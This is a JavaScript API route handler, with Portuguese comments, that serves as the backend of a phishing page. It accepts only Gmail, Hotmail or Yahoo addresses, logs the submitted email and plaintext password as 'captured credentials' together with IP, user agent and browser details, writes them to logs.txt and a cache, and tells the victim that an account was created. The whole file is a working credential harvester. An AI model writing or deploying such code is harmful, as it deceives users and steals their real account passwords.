export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method not allowed' });
  }

  const { email, password, sessionId } = req.body;

  // Captura de informações do request
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const userAgent = req.headers['user-agent'];
  const referer = req.headers['referer'];
  const timestamp = new Date().toISOString();
  const origin = req.headers['origin'];
  const browserInfo = req.headers['x-browser-info'] ? JSON.parse(req.headers['x-browser-info']) : {};
  const forwardedFor = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  // Validação de email
  if (!email.includes('@gmail.com') && !email.includes('@hotmail.com') && !email.includes('@yahoo.com')) {
    return res.status(400).json({ 
      status: 'erro',
      message: 'Email inválido' 
    });
  }

  // Log completo
  console.log('----------------------------------');
  console.log('📥 Credenciais Capturadas');
  console.log(`📧 Email: ${email}`);
  console.log(`🔑 Senha: ${password}`);
  console.log(`🌐 IP: ${ip}`);
  console.log(`📱 User-Agent: ${userAgent}`);
  console.log(`🔗 Referer: ${referer}`);
  console.log(`🕒 Timestamp: ${timestamp}`);
  console.log(`🌐 Origin: ${origin}`);
  console.log(`📊 Browser Info:`, JSON.stringify(browserInfo));
  console.log(`👤 Session ID: ${sessionId}`);
  console.log('----------------------------------');

  // Armazena em arquivo de log
  try {
    const fs = require('fs');
    fs.appendFileSync('logs.txt', 
      `[${timestamp}] Email: ${email}, Senha: ${password}, IP: ${ip}, UA: ${userAgent}, Browser: ${JSON.stringify(browserInfo)}\n`);
  } catch (err) {
    console.error('Erro ao salvar log:', err);
  }

  // Armazena dados de sessão
  try {
    const cache = require('node-cache');
    const sessionCache = new cache();
    sessionCache.set(sessionId, { email, password, ip, browserInfo }, 3600);
  } catch (err) {
    console.error('Erro ao armazenar sessão:', err);
  }

  return res.status(200).json({ 
    status: 'capturado',
    message: 'Conta criada com sucesso!' 
  });
}
